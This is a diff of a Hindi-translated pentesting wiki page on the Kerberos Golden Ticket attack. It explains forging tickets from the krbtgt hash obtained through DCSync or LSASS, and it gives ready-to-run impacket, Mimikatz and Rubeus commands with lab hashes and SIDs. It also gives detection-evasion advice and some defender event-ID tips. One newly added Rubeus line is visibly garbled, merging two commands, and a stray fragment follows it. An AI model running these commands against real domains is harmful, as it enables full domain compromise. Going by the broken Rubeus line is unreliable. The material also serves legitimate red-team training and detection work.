@@ -6,9 +6,9 @@
 
 एक **Golden Ticket** हमला **किसी भी उपयोगकर्ता का अनुकरण करते हुए एक वैध Ticket Granting Ticket (TGT) बनाने** पर आधारित है, जो **Active Directory (AD) krbtgt खाते के NTLM हैश** का उपयोग करता है। यह तकनीक विशेष रूप से फायदेमंद है क्योंकि यह **अनुकरण किए गए उपयोगकर्ता के रूप में डोमेन के भीतर किसी भी सेवा या मशीन तक पहुंच** की अनुमति देती है। यह याद रखना महत्वपूर्ण है कि **krbtgt खाते के क्रेडेंशियल्स कभी स्वचालित रूप से अपडेट नहीं होते**।
 
-**krbtgt खाते का NTLM हैश प्राप्त करने** के लिए विभिन्न विधियों का उपयोग किया जा सकता है। इसे **Local Security Authority Subsystem Service (LSASS) प्रक्रिया** या **NT Directory Services (NTDS.dit) फ़ाइल** से निकाला जा सकता है, जो डोमेन के भीतर किसी भी Domain Controller (DC) पर स्थित है। इसके अलावा, **DCsync हमले को निष्पादित करना** इस NTLM हैश को प्राप्त करने की एक और रणनीति है, जिसे **Mimikatz में lsadump::dcsync मॉड्यूल** या **Impacket द्वारा secretsdump.py स्क्रिप्ट** का उपयोग करके किया जा सकता है। यह महत्वपूर्ण है कि इन कार्यों को करने के लिए **डोमेन प्रशासनिक विशेषाधिकार या समान स्तर की पहुंच की आवश्यकता होती है**।
+**krbtgt खाते का NTLM हैश प्राप्त करने** के लिए विभिन्न विधियों का उपयोग किया जा सकता है। इसे **Local Security Authority Subsystem Service (LSASS) प्रक्रिया** से या **NT Directory Services (NTDS.dit) फ़ाइल** से निकाला जा सकता है, जो डोमेन के भीतर किसी भी Domain Controller (DC) पर स्थित है। इसके अलावा, **DCsync हमले को निष्पादित करना** इस NTLM हैश को प्राप्त करने की एक और रणनीति है, जिसे **Mimikatz में lsadump::dcsync मॉड्यूल** या **Impacket द्वारा secretsdump.py स्क्रिप्ट** का उपयोग करके किया जा सकता है। यह महत्वपूर्ण है कि इन कार्यों को करने के लिए **डोमेन एडमिन विशेषाधिकार या समान स्तर की पहुंच की आवश्यकता होती है**।
 
-हालांकि NTLM हैश इस उद्देश्य के लिए एक व्यवहार्य विधि के रूप में कार्य करता है, लेकिन **संचालन सुरक्षा कारणों से** **Advanced Encryption Standard (AES) Kerberos कुंजियों (AES128 और AES256) का उपयोग करके टिकटों को बनाना** **काफी अनुशंसित** है।
+हालांकि NTLM हैश इस उद्देश्य के लिए एक व्यवहार्य विधि के रूप में कार्य करता है, लेकिन **संचालन सुरक्षा कारणों से Advanced Encryption Standard (AES) Kerberos कुंजियों (AES128 और AES256) का उपयोग करके टिकटों को बनाना** **काफी अनुशंसित** है।
 ```bash:From Linux
 python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
 export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
@@ -16,6 +16,12 @@ python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
 ```
 
 ```bash:From Windows
+# Rubeus
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+.\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+/rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /ptt
 #mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
 .\Rubeus.exe ptt /ticket:ticket.kirbi
@@ -28,7 +34,7 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 
 ### सामान्य पहचान को बायपास करना
 
-गोल्डन टिकट का पता लगाने के सबसे सामान्य तरीके **केर्बेरोस ट्रैफ़िक** की जांच करना हैं। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 वर्षों के लिए साइन** करता है, जो इसके साथ किए गए बाद के TGS अनुरोधों में असामान्य के रूप में खड़ा होगा।
+गोल्डन टिकट का पता लगाने के सबसे सामान्य तरीके **केर्बेरोस ट्रैफ़िक** की जांच करना है। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 वर्षों के लिए साइन करता है**, जो इसके साथ किए गए बाद के TGS अनुरोधों में असामान्य के रूप में खड़ा होगा।
 
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
@@ -36,7 +42,7 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
-दुर्भाग्यवश, TGT का जीवनकाल 4769 में लॉग नहीं किया गया है, इसलिए आप इस जानकारी को Windows इवेंट लॉग में नहीं पाएंगे। हालाँकि, आप जो सहसंबंधित कर सकते हैं वह है **4769 को बिना पूर्व 4768 के देखना**। यह **TGT के बिना TGS का अनुरोध करना संभव नहीं है**, और यदि TGT जारी होने का कोई रिकॉर्ड नहीं है, तो हम यह निष्कर्ष निकाल सकते हैं कि इसे ऑफ़लाइन तैयार किया गया था।
+दुर्भाग्यवश, TGT का जीवनकाल 4769 में लॉग नहीं किया गया है, इसलिए आप यह जानकारी Windows इवेंट लॉग में नहीं पाएंगे। हालाँकि, आप जो सहसंबंधित कर सकते हैं वह है **4769 को बिना पूर्व 4768 के देखना**। यह **TGT के बिना TGS का अनुरोध करना संभव नहीं है**, और यदि TGT जारी होने का कोई रिकॉर्ड नहीं है, तो हम यह निष्कर्ष निकाल सकते हैं कि इसे ऑफ़लाइन तैयार किया गया था।
 
 इस **पता लगाने से बचने के लिए** हीरे के टिकटों की जांच करें:
 
@@ -50,7 +56,7 @@ diamond-ticket.md
 - 4672: प्रशासनिक लॉगिन
 - `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`
 
-रक्षा करने वालों के लिए अन्य छोटे ट्रिक्स हैं **संवेदनशील उपयोगकर्ताओं के लिए 4769 पर अलर्ट करना** जैसे कि डिफ़ॉल्ट डोमेन प्रशासक खाता।
+रक्षा करने वाले अन्य छोटे ट्रिक्स यह कर सकते हैं कि **संवेदनशील उपयोगकर्ताओं के लिए 4769 पर अलर्ट करें** जैसे कि डिफ़ॉल्ट डोमेन प्रशासक खाता।
 
 ## संदर्भ
 
